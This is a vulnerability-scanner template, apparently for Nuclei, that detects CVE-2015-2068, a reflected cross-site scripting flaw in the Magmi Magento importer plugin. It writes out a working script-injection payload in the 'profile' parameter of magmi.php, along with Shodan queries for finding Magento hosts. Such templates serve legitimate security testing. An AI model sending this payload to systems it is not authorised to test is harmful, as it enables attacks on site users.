http:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/magmi/web/magmi.php?configstep=2&profile=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2015-2068
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:magmi_project:magmi:-:*:*:*:*:magento_server:*:*
    cve-id: CVE-2015-2068
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
    cvss-score: 4.3
    cwe-id: CWE-79
    epss-percentile: 0.89807
    epss-score: 0.05406
  description: Magento Server Mass Importer plugin contains multiple cross-site scripting
    vulnerabilities which allow remote attackers to inject arbitrary web script or
    HTML via the (1) profile parameter to web/magmi.php or (2) QUERY_STRING to web/magmi_import_run.php.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected Magento server.

    '
  metadata:
    framework: magento_server
    max-request: 1
    product: magmi
    shodan-query:
    - http.component:"Magento"
    - http.component:"magento"
    vendor: magmi_project
    verified: true
  name: Magento Server Mass Importer - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/35996
  - http://packetstormsecurity.com/files/130250/Magento-Server-MAGMI-Cross-Site-Scripting-Local-File-Inclusion.html
  - https://nvd.nist.gov/vuln/detail/CVE-2015-2068
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Apply the latest security patches provided by Magento to fix the XSS
    vulnerability in the Server Mass Importer module.

    '
  severity: medium
  tags: cve2015,cve,plugin,edb,packetstorm,magento,magmi,xss,magmi_project,magento_server,vuln
